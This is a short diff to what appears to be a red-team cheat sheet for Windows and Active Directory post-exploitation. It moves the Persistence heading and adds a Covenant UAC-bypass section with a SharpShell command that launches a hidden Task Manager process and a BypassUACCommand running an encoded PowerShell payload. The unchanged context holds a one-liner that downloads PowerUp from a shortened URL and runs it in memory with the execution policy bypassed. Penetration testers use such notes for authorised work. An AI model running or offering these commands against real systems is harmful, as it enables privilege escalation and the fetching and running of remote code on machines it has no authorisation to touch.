@@ -161,8 +161,6 @@ Find-LAPSDelegatedGroups
 
 # PrivEsc
 
-# Persistence
-
 #### PowerUp
 
 ```cpp
@@ -177,7 +175,16 @@ If you want to invoke everything without touching disk, use something like this:
 powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
 ```
 
+Covenant has `BypassUACCommand` and `BypassUACGrunt` Tasks which can be used 
 
+```cpp
+SharpShell /code:"var startInfo = new System.Diagnostics.ProcessStartInfo { FileName = @\"C:\Windows\System32\Taskmgr.exe\", WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden }; var taskmgr = new System.Diagnostics.Process { StartInfo = startInfo }; taskmgr.Start(); return taskmgr.Id.ToString();"
+
+BypassUACCommand cmd.exe "/c powershell -enc [...snip...]"
+```
+
+
+# Persistence
 
 ### Classic Startup folder
 
